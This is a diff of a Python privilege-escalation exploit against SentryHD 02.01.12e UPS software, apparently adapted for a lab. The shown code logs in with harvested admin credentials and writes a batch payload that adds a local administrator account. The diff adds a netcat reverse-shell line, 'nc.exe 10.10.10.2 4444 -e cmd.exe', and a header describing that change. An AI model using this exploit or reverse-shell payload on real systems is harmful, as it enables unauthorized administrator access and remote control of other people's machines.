@@ -1,4 +1,10 @@
 '''
+EDITED BY JACK TO WORK ON PYTHON 3 AND HAVE A REVERSE SHELL SENT BACK TO
+'10.10.10.2:4444'
+** assumes C:\\Users\\uncle\\HAVIC_XSS_2\\flask_back\\nc.exe exists
+
+RUN THIS AS NON ADMIN USER ON SENTRY HD SERVER
+
 # Exploit Title: SentryHD 02.01.12e Privilege Escalation
 # Date: 18-01-2017
 # Software Link: http://www.minutemanups.com/
@@ -51,7 +57,6 @@ print("[+] Find admin user: '{}' and password: '{}'".format(admin_user, admin_pa
 cj = CookieJar()
 opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
 
-#I added '.decode('utf-8')'
 challenge = re.search("\"Challenge\" value=\"(.*?)\"", opener.open("http://localhost/").read().decode())
 
 formdata = { "Username" : admin_user, "Password": admin_password, "Challenge" : challenge, "Response":  hashlib.md5((admin_user+admin_password+challenge.group(1)).encode()).hexdigest()}
@@ -65,6 +70,7 @@ bat_path = os.path.dirname(os.path.abspath(__file__))+"\\create_user.bat"
 payload = open(bat_path, "w")
 payload.write("net user {} /add\n".format(new_user_name))
 payload.write("net localgroup Administrators {} /add".format(new_user_name))
+payload.write("C:\\Users\\uncle\\HAVIC_XSS_2\\flask_back\\nc.exe 10.10.10.2 4444 -e cmd.exe\n")
 payload.close()
 
 print("[+] Create payload: {}".format(bat_path))
